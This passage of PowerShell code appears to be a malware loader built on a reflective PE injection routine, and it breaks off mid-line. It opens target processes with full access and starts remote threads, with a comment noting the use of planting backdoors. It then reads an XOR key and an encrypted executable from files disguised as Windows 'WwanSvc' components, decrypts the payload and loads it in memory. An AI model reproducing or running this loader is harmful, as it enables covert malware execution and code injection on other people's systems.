\"Done unloading the libraries needed by the PE\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0break\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($ImportDllHandle -eq $null)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Warning \"Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways\" -WarningAction Continue\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Warning \"Unable to free library: $ImportDllPath. Continuing anyways.\" -WarningAction Continue\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Call DllMain with process detach\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Calling dllmain so the DLL knows it is being unloaded\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Warning \"Unable to call VirtualFree on the PE's memory. Continuing anyways.\" -WarningAction Continue\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0}\n\n\n\t\t\t\u00a0\u00a0\u00a0Function Main\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions = Get-Win32Functions\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types = Get-Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants = Get-Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RemoteProcHandle = [IntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#If a remote process to inject in to is specified, get a handle to it\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne \"\"))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Can't supply a ProcId and ProcName, choose one or the other\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0elseif ($ProcName -ne $null -and $ProcName -ne \"\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Processes.Count -eq 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Can't find process $ProcName\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0elseif ($Processes.Count -gt 1)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-Output $ProcInfo\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"More than one instance of $ProcName found, please specify the process ID to inject in to.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProcId = $Processes[0].ID\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Getting SeDebugPrivilege\"\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0} \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($ProcId -ne $null) -and ($ProcId -ne 0))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Couldn't obtain the handle for process ID: $ProcId\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Got the handle for the remote process to inject in to\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Load the PE reflectively\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Calling Invoke-MemoryLoadLibrary\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEHandle = [IntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PELoadedInfo = Invoke-MemoryLoadLibrary -ExeArgs $ExeArgs -ForceASLR $ForceASLR\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PELoadedInfo = Invoke-MemoryLoadLibrary -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PELoadedInfo -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to load PE, handle returned is NULL\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEHandle = $PELoadedInfo[0]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#########################################\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0### YOUR CODE GOES HERE\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#########################################\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0switch ($FuncReturnType)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0'WString' {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Calling function with WString return type\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"WStringFunc\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($WStringFuncAddr -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Couldn't find function address.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$WStringFuncDelegate = Get-DelegateType @() ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$OutputPtr = $WStringFunc.Invoke()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-Output $Output\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0'String' {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Calling function with String return type\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"StringFunc\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($StringFuncAddr -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Couldn't find function address.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$StringFuncDelegate = Get-DelegateType @() ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$OutputPtr = $StringFunc.Invoke()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-Output $Output\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0'Void' {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Calling function with Void return type\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"VoidFunc\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($VoidFuncAddr -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Couldn't find function address.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VoidFuncDelegate = Get-DelegateType @() ([Void])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VoidFunc.Invoke() | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#########################################\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0### END OF YOUR CODE\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#########################################\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#For remote DLL injection, call a void function which takes no parameters\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0elseif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -ne [IntPtr]::Zero))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"VoidFunc\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"VoidFunc couldn't be found in the DLL\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Don't free a library if it is injected in a remote process or if it is an EXE.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Note that all DLL's loaded by the EXE will remain loaded in memory.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq \"DLL\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Invoke-MemoryFreeLibrary -PEHandle $PEHandle\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Delete the PE file from memory.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Warning \"Unable to call VirtualFree on the PE's memory. Continuing anyways.\" -WarningAction Continue\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Done!\"\n\t\t\t\u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0Main\n\t\t\t}\n\n\n\n\t\t\t$key = [IO.File]::ReadAllBytes('c:\\programdata\\Microsoft\\WwanSvc.a')\n\t\t\t$PEBytes = [IO.File]::ReadAllBytes('c:\\programdata\\Microsoft\\WwanSvc.b')\n\n\t\t\tWrite-Host 1\n\n\t\t\t#Write-Host 'Key length: ' $key.count\n\t\t\t#Write-Host 'Encrypted length: ' $PEBytes.count\n\n\t\t\tfor($i=0; $i -lt $PEBytes.count ; $i++) {\n\t\t\t\u00a0\u00a0\u00a0$PEBytes[$i] = ($PEBytes[$i] -bxor $key[$i % $key.count])\n\t\t\t}\n\n\t\t\tWrite-Host 2\n\n\t\t\t#Write-Host 'Dump decrypted base64 PEBytes...'\n\n\t\t\t$FuncReturnType = 'Void'\n\t\t\t$ProcId = $null\n\t\t\t$ProcName = $null\n\t\t\t$ForceASLR = 0\n\t\t\t$ComputerName = $null\n\t\t\t$DoNotZeroMZ = 0;\n\t\t\t$ExeArgs = \"none\"\n\n\t\t\tWrite-Host 3\n\n\t\t\t#Verify the image is a valid PE file\n\t\t\t$e_magic = ($PEBytes[0..1000000] | % {[Char] $_}) -join ''\n\n\t\t\tif ($e_magic -ne 'MZ') {\n\t\t\t\u00a0\u00a0\u00a0throw 'PE is not 